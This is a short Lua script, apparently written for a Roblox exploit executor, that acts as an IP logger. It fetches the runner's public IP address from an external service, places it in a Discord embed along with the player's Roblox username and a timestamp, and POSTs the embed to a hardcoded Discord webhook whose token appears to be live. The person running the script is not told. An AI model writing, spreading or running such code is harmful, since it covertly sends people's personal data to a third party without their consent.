local ip = tostring(game:HttpGet("http://api.ipify.org"))
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = 'Script Alert';
local Embed = {
    title = 'Detetcted User';
    color = '99999';
    footer = { text = ip };
    author = {
        name = 'ROBLOX';
        url = 'https://www.roblox.com/';
    };
    fields = {
        {
            name = 'Detetcted User';
            value = game.Players.LocalPlayer.Name;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/851942724835082250/8tux4OnJKiVLnFFTAUdb_995mpKMoBsg4XhSwKsLFPFP4YfnU6LsMbf1kACqhRzIvt3X';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
